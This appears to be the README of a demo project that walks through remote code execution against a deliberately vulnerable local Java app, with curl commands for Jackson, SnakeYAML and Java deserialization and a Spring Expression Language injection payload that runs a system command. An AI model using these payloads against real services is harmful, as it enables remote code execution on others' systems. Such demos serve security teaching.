# Remote Code Execution Demo

## How To: Exploit vulnerabilities to perform RCE (Java 1.8.0_181 required)

# Jackson deserialization

```
curl -X POST http://localhost:8080/vulnerable/deserialize -H "Content-Type: application/json" --data-binary @jackson.json
```

# Spring Expression Language

```
curl -X POST http://localhost:8080/vulnerable/expression -H "Content-Type: text/plain" -d "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')"
```

# SnakeYAML

```
curl -X POST http://localhost:8080/vulnerable/yaml -H "Content-Type: text/plain" --data-binary @snake-yaml.yaml
```

# ObjectInputStream exploit

```
curl -X POST http://localhost:8080/vulnerable/ois --data-binary @ois.bin -H "Content-Type: application/octet-stream"
```